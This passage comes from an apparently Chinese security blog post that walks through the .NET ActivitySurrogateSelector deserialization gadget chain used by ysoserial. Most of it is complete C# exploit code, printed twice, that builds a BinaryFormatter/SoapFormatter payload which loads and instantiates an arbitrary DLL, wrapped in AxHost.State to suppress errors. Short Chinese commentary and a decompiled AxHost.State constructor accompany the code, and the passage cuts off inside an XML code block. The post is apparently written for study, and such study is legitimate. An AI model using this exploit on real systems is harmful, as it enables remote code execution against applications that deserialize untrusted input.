&#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">     [<span class="meta">Serializable</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">PayloadClass</span> : <span class="title">ISerializable</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="built_in">byte</span>[] assemblyBytes;</span><br><span class="line">        <span class="keyword">protected</span> <span class="built_in">int</span> variant_number = <span class="number">1</span>;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">PayloadClass</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">this</span>.assemblyBytes = File.ReadAllBytes(<span class="string">&quot;E:\\CTFLearning\\开发学习\\CsharpLearning\\ExpClassa\\ExpClassa\\obj\\Debug\\ExpClassa.dll&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="title">IEnumerable</span>&lt;<span class="title">TResult</span>&gt; <span class="title">CreateWhereSelectEnumerableIterator</span>&lt;<span class="title">TSource</span>, <span class="title">TResult</span>&gt;(<span class="params">IEnumerable&lt;TSource&gt; src, Func&lt;TSource, <span class="built_in">bool</span>&gt; predicate, Func&lt;TSource, TResult&gt; selector</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Type t = Assembly.Load(<span class="string">&quot;System.Core, Version=3.5.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&quot;</span>)</span><br><span class="line">              .GetType(<span class="string">&quot;System.Linq.Enumerable+WhereSelectEnumerableIterator`2&quot;</span>)</span><br><span class="line">              .MakeGenericType(<span class="keyword">typeof</span>(TSource), <span class="keyword">typeof</span>(TResult));</span><br><span class="line">            <span class="keyword">return</span> t.GetConstructors()[<span class="number">0</span>].Invoke(<span class="keyword">new</span> <span class="built_in">object</span>[] &#123; src, predicate, selector &#125;) <span class="keyword">as</span> IEnumerable&lt;TResult&gt;;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="title">PayloadClass</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> List&lt;<span class="built_in">object</span>&gt; <span class="title">GadgetChains</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            DesignerVerb verb = <span class="literal">null</span>;</span><br><span class="line">            Hashtable ht = <span class="literal">null</span>;</span><br><span class="line">            List&lt;<span class="built_in">object</span>&gt; ls = <span class="literal">null</span>;</span><br><span class="line">            List&lt;<span class="built_in">byte</span>[]&gt; data = <span class="keyword">new</span> List&lt;<span class="built_in">byte</span>[]&gt;();</span><br><span class="line">            data.Add(<span class="keyword">this</span>.assemblyBytes);</span><br><span class="line">            <span class="keyword">var</span> e1 = data.Select(Assembly.Load);</span><br><span class="line">            Func&lt;Assembly, IEnumerable&lt;Type&gt;&gt; map_type = (Func&lt;Assembly, IEnumerable&lt;Type&gt;&gt;)Delegate.CreateDelegate(<span class="keyword">typeof</span>(Func&lt;Assembly, IEnumerable&lt;Type&gt;&gt;), <span class="keyword">typeof</span>(Assembly).GetMethod(<span class="string">&quot;GetTypes&quot;</span>));</span><br><span class="line">            <span class="keyword">var</span> e2 = e1.SelectMany(map_type);</span><br><span class="line">            <span class="keyword">var</span> e3 = e2.Select(Activator.CreateInstance);</span><br><span class="line">            PagedDataSource pds = <span class="keyword">new</span> PagedDataSource() &#123; DataSource = e3 &#125;;</span><br><span class="line">            IDictionary dict = (IDictionary)Activator.CreateInstance(<span class="keyword">typeof</span>(<span class="built_in">int</span>).Assembly.GetType(<span class="string">&quot;System.Runtime.Remoting.Channels.AggregateDictionary&quot;</span>), pds);</span><br><span class="line">            verb = <span class="keyword">new</span> DesignerVerb(<span class="string">&quot;&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">            <span class="keyword">typeof</span>(MenuCommand).GetField(<span class="string">&quot;properties&quot;</span>, BindingFlags.NonPublic | BindingFlags.Instance).SetValue(verb, dict);</span><br><span class="line">            ls = <span class="keyword">new</span> List&lt;<span class="built_in">object</span>&gt;();</span><br><span class="line">            ls.Add(e1);</span><br><span class="line">            ls.Add(e2);</span><br><span class="line">            ls.Add(e3);</span><br><span class="line">            ls.Add(pds);</span><br><span class="line">            ls.Add(verb);</span><br><span class="line">            ls.Add(dict);</span><br><span class="line">            ht = <span class="keyword">new</span> Hashtable();</span><br><span class="line">            ht.Add(verb, <span class="string">&quot;&quot;</span>);</span><br><span class="line">            ht.Add(<span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">            FieldInfo fi_keys = ht.GetType().GetField(<span class="string">&quot;buckets&quot;</span>, BindingFlags.NonPublic | BindingFlags.Instance);</span><br><span class="line">            Array keys = (Array)fi_keys.GetValue(ht);</span><br><span class="line">            FieldInfo fi_key = keys.GetType().GetElementType().GetField(<span class="string">&quot;key&quot;</span>, BindingFlags.Public | BindingFlags.Instance);</span><br><span class="line">            <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; keys.Length; ++i)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">object</span> bucket = keys.GetValue(i);</span><br><span class="line">                <span class="built_in">object</span> key = fi_key.GetValue(bucket);</span><br><span class="line">                <span class="keyword">if</span> (key <span class="keyword">is</span> <span class="built_in">string</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    fi_key.SetValue(bucket, verb);</span><br><span class="line">                    keys.SetValue(bucket, i);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            fi_keys.SetValue(ht, keys);</span><br><span class="line"></span><br><span class="line">            ls.Add(ht);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> ls;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="built_in">byte</span>[] <span class="title">GadgetChainsToBinaryFormatter</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            List&lt;<span class="built_in">object</span>&gt; ls = GadgetChains();</span><br><span class="line">            MemoryStream stm = <span class="keyword">new</span> MemoryStream();</span><br><span class="line">            System.Runtime.Serialization.Formatters.Binary.BinaryFormatter fmt = <span class="keyword">new</span> System.Runtime.Serialization.Formatters.Binary.BinaryFormatter();</span><br><span class="line">            fmt.SurrogateSelector = <span class="keyword">new</span> MySurrogateSelector();</span><br><span class="line">            fmt.Serialize(stm, ls);</span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> stm.ToArray();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GetObjectData</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            System.Diagnostics.Trace.WriteLine(<span class="string">&quot;In GetObjectData&quot;</span>);</span><br><span class="line">            info.SetType(<span class="keyword">typeof</span>(System.Windows.Forms.AxHost.State));</span><br><span class="line">            info.AddValue(<span class="string">&quot;PropertyBagBinary&quot;</span>, GadgetChainsToBinaryFormatter());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Exp</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            System.Configuration.ConfigurationManager.AppSettings.Set(<span class="string">&quot;microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line"></span><br><span class="line">            PayloadClass payload = <span class="keyword">new</span> PayloadClass();</span><br><span class="line">            <span class="keyword">using</span> (MemoryStream memoryStream = <span class="keyword">new</span> MemoryStream(payload.GadgetChainsToBinaryFormatter()))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 构建formatter</span></span><br><span class="line">                <span class="comment">// SoapFormatter sp1 = new SoapFormatter();</span></span><br><span class="line">                <span class="comment">// sp1.Serialize(memoryStream, payload);</span></span><br><span class="line">                memoryStream.Position = <span class="number">0</span>;</span><br><span class="line">                <span class="comment">// var sp2=new SoapFormatter();</span></span><br><span class="line">                <span class="keyword">var</span> bn=<span class="keyword">new</span> BinaryFormatter();</span><br><span class="line">                bn.Deserialize(memoryStream);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1708950187517-0d9b52cf-ed25-4e7e-8dcd-23ef40212229.png#averageHue=%23659c77&clientId=u9e1fcbc0-b876-4&from=paste&height=778&id=u947297b5&originHeight=972&originWidth=1913&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=258963&status=done&style=none&taskId=ue3c4a23f-63ea-466e-9b3c-3169a575f3e&title=&width=1530.4" alt="image.png"><br>虽然也可以弹窗，但是这个payload会报错，在实战中可能会导致利用失败，为了避免这种情况，ysoserial选择了一种二次反序列化的做法。</p><h2 id="0-3-3-AxHost-State"><a href="#0-3-3-AxHost-State" class="headerlink" title="0-3.3 AxHost.State"></a>0-3.3 AxHost.State</h2><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="title">State</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">      &#123;</span><br><span class="line">        SerializationInfoEnumerator enumerator = info.GetEnumerator();</span><br><span class="line">        <span class="keyword">if</span> (enumerator == <span class="literal">null</span>)</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">while</span> (enumerator.MoveNext())</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (<span class="built_in">string</span>.Compare(enumerator.Name, <span class="string">&quot;Data&quot;</span>, <span class="literal">true</span>, CultureInfo.InvariantCulture) == <span class="number">0</span>)</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">              <span class="built_in">byte</span>[] buffer = (<span class="built_in">byte</span>[]) enumerator.Value;</span><br><span class="line">              <span class="keyword">if</span> (buffer != <span class="literal">null</span>)</span><br><span class="line">                <span class="keyword">this</span>.InitializeFromStream((Stream) <span class="keyword">new</span> MemoryStream(buffer));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Exception ex)</span><br><span class="line">            &#123;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">string</span>.Compare(enumerator.Name, <span class="string">&quot;PropertyBagBinary&quot;</span>, <span class="literal">true</span>, CultureInfo.InvariantCulture) == <span class="number">0</span>)</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">              <span class="built_in">byte</span>[] buffer = (<span class="built_in">byte</span>[]) enumerator.Value;</span><br><span class="line">              <span class="keyword">if</span> (buffer != <span class="literal">null</span>)</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="keyword">this</span>.propBag = <span class="keyword">new</span> AxHost.PropertyBagStream();</span><br><span class="line">                <span class="keyword">this</span>.propBag.Read((Stream) <span class="keyword">new</span> MemoryStream(buffer));</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Exception ex)</span><br><span class="line">            &#123;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>在反序列化的时候他会对PropertyBagBinary进行binary反序列化。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1708950267144-cfe1be80-5b4e-4cf5-b58e-89f1b1013f66.png#averageHue=%231e1d1d&clientId=u9e1fcbc0-b876-4&from=paste&height=402&id=u67e60691&originHeight=503&originWidth=1219&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=66944&status=done&style=none&taskId=u138306cf-6816-4385-a0bd-884f696ebb9&title=&width=975.2" alt="image.png"><br>最主要的是这里还做了异常处理，就避免了异常发生。</p><h2 id="0-3-4-最终Payload"><a href="#0-3-4-最终Payload" class="headerlink" title="0-3.4 最终Payload"></a>0-3.4 最终Payload</h2><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.Linq;</span><br><span class="line"><span class="keyword">using</span> System.Collections;</span><br><span class="line"><span class="keyword">using</span> System.ComponentModel.Design;</span><br><span class="line"><span class="keyword">using</span> System.Data;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Reflection;</span><br><span class="line"><span class="keyword">using</span> System.Web.UI.WebControls;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization.Formatters.Binary;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization.Formatters.Soap;</span><br><span class="line"><span class="keyword">using</span> NDesk.Options;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">ysoserial.Generators</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">MySurrogateSelector</span> : <span class="title">SurrogateSelector</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> ISerializationSurrogate <span class="title">GetSurrogate</span>(<span class="params">Type type, StreamingContext context, <span class="keyword">out</span> ISurrogateSelector selector</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            selector = <span class="keyword">this</span>;</span><br><span class="line">            <span class="keyword">if</span> (!type.IsSerializable)</span><br><span class="line">            &#123;</span><br><span class="line">                Type t = Type.GetType(<span class="string">&quot;System.Workflow.ComponentModel.Serialization.ActivitySurrogateSelector+ObjectSurrogate, System.Workflow.ComponentModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> (ISerializationSurrogate)Activator.CreateInstance(t);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">base</span>.GetSurrogate(type, context, <span class="keyword">out</span> selector);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">     [<span class="meta">Serializable</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">PayloadClass</span> : <span class="title">ISerializable</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="built_in">byte</span>[] assemblyBytes;</span><br><span class="line">        <span class="keyword">protected</span> <span class="built_in">int</span> variant_number = <span class="number">1</span>;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">PayloadClass</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">this</span>.assemblyBytes = File.ReadAllBytes(<span class="string">&quot;E:\\CTFLearning\\开发学习\\CsharpLearning\\ExpClassa\\ExpClassa\\obj\\Debug\\ExpClassa.dll&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="title">IEnumerable</span>&lt;<span class="title">TResult</span>&gt; <span class="title">CreateWhereSelectEnumerableIterator</span>&lt;<span class="title">TSource</span>, <span class="title">TResult</span>&gt;(<span class="params">IEnumerable&lt;TSource&gt; src, Func&lt;TSource, <span class="built_in">bool</span>&gt; predicate, Func&lt;TSource, TResult&gt; selector</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Type t = Assembly.Load(<span class="string">&quot;System.Core, Version=3.5.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&quot;</span>)</span><br><span class="line">              .GetType(<span class="string">&quot;System.Linq.Enumerable+WhereSelectEnumerableIterator`2&quot;</span>)</span><br><span class="line">              .MakeGenericType(<span class="keyword">typeof</span>(TSource), <span class="keyword">typeof</span>(TResult));</span><br><span class="line">            <span class="keyword">return</span> t.GetConstructors()[<span class="number">0</span>].Invoke(<span class="keyword">new</span> <span class="built_in">object</span>[] &#123; src, predicate, selector &#125;) <span class="keyword">as</span> IEnumerable&lt;TResult&gt;;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="title">PayloadClass</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> List&lt;<span class="built_in">object</span>&gt; <span class="title">GadgetChains</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            DesignerVerb verb = <span class="literal">null</span>;</span><br><span class="line">            Hashtable ht = <span class="literal">null</span>;</span><br><span class="line">            List&lt;<span class="built_in">object</span>&gt; ls = <span class="literal">null</span>;</span><br><span class="line">            List&lt;<span class="built_in">byte</span>[]&gt; data = <span class="keyword">new</span> List&lt;<span class="built_in">byte</span>[]&gt;();</span><br><span class="line">            data.Add(<span class="keyword">this</span>.assemblyBytes);</span><br><span class="line">            <span class="keyword">var</span> e1 = data.Select(Assembly.Load);</span><br><span class="line">            Func&lt;Assembly, IEnumerable&lt;Type&gt;&gt; map_type = (Func&lt;Assembly, IEnumerable&lt;Type&gt;&gt;)Delegate.CreateDelegate(<span class="keyword">typeof</span>(Func&lt;Assembly, IEnumerable&lt;Type&gt;&gt;), <span class="keyword">typeof</span>(Assembly).GetMethod(<span class="string">&quot;GetTypes&quot;</span>));</span><br><span class="line">            <span class="keyword">var</span> e2 = e1.SelectMany(map_type);</span><br><span class="line">            <span class="keyword">var</span> e3 = e2.Select(Activator.CreateInstance);</span><br><span class="line">            PagedDataSource pds = <span class="keyword">new</span> PagedDataSource() &#123; DataSource = e3 &#125;;</span><br><span class="line">            IDictionary dict = (IDictionary)Activator.CreateInstance(<span class="keyword">typeof</span>(<span class="built_in">int</span>).Assembly.GetType(<span class="string">&quot;System.Runtime.Remoting.Channels.AggregateDictionary&quot;</span>), pds);</span><br><span class="line">            verb = <span class="keyword">new</span> DesignerVerb(<span class="string">&quot;&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">            <span class="keyword">typeof</span>(MenuCommand).GetField(<span class="string">&quot;properties&quot;</span>, BindingFlags.NonPublic | BindingFlags.Instance).SetValue(verb, dict);</span><br><span class="line">            ls = <span class="keyword">new</span> List&lt;<span class="built_in">object</span>&gt;();</span><br><span class="line">            ls.Add(e1);</span><br><span class="line">            ls.Add(e2);</span><br><span class="line">            ls.Add(e3);</span><br><span class="line">            ls.Add(pds);</span><br><span class="line">            ls.Add(verb);</span><br><span class="line">            ls.Add(dict);</span><br><span class="line">            ht = <span class="keyword">new</span> Hashtable();</span><br><span class="line">            ht.Add(verb, <span class="string">&quot;&quot;</span>);</span><br><span class="line">            ht.Add(<span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">            FieldInfo fi_keys = ht.GetType().GetField(<span class="string">&quot;buckets&quot;</span>, BindingFlags.NonPublic | BindingFlags.Instance);</span><br><span class="line">            Array keys = (Array)fi_keys.GetValue(ht);</span><br><span class="line">            FieldInfo fi_key = keys.GetType().GetElementType().GetField(<span class="string">&quot;key&quot;</span>, BindingFlags.Public | BindingFlags.Instance);</span><br><span class="line">            <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; keys.Length; ++i)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">object</span> bucket = keys.GetValue(i);</span><br><span class="line">                <span class="built_in">object</span> key = fi_key.GetValue(bucket);</span><br><span class="line">                <span class="keyword">if</span> (key <span class="keyword">is</span> <span class="built_in">string</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    fi_key.SetValue(bucket, verb);</span><br><span class="line">                    keys.SetValue(bucket, i);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            fi_keys.SetValue(ht, keys);</span><br><span class="line"></span><br><span class="line">            ls.Add(ht);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> ls;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="built_in">byte</span>[] <span class="title">GadgetChainsToBinaryFormatter</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            List&lt;<span class="built_in">object</span>&gt; ls = GadgetChains();</span><br><span class="line">            MemoryStream stm = <span class="keyword">new</span> MemoryStream();</span><br><span class="line">            System.Runtime.Serialization.Formatters.Binary.BinaryFormatter fmt = <span class="keyword">new</span> System.Runtime.Serialization.Formatters.Binary.BinaryFormatter();</span><br><span class="line">            fmt.SurrogateSelector = <span class="keyword">new</span> MySurrogateSelector();</span><br><span class="line">            fmt.Serialize(stm, ls);</span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> stm.ToArray();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GetObjectData</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            System.Diagnostics.Trace.WriteLine(<span class="string">&quot;In GetObjectData&quot;</span>);</span><br><span class="line">            info.SetType(<span class="keyword">typeof</span>(System.Windows.Forms.AxHost.State));</span><br><span class="line">            info.AddValue(<span class="string">&quot;PropertyBagBinary&quot;</span>, GadgetChainsToBinaryFormatter());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Exp</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            System.Configuration.ConfigurationManager.AppSettings.Set(<span class="string">&quot;microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line"></span><br><span class="line">            PayloadClass payload = <span class="keyword">new</span> PayloadClass();</span><br><span class="line">            <span class="keyword">using</span> (MemoryStream memoryStream = <span class="keyword">new</span> MemoryStream())</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//构建formatter</span></span><br><span class="line">                SoapFormatter sp1 = <span class="keyword">new</span> SoapFormatter();</span><br><span class="line">                sp1.Serialize(memoryStream, payload);</span><br><span class="line">                memoryStream.Position = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">var</span> sp2=<span class="keyword">new</span> SoapFormatter();</span><br><span class="line">                <span class="comment">// var bn=new BinaryFormatter();</span></span><br><span class="line">                sp2.Deserialize(memoryStream);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最终payload如上，经过了一层State包装就保证了不会报错。至此这条利用链就完成了</p><h1 id="0-4-ActivitySurrogateSelectorFromFile"><a href="#0-4-ActivitySurrogateSelectorFromFile" class="headerlink" title="0-4 ActivitySurrogateSelectorFromFile"></a>0-4 ActivitySurrogateSelectorFromFile</h1><p>只是取这个名字而已，就是动态控制dll文件的内容，不难实现，ysoserial帮我们做好了。</p><h1 id="0-5-小结"><a href="#0-5-小结" class="headerlink" title="0-5 小结"></a>0-5 小结</h1><p>到这里可以发现其实和标题的Soap是没啥关系的。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span 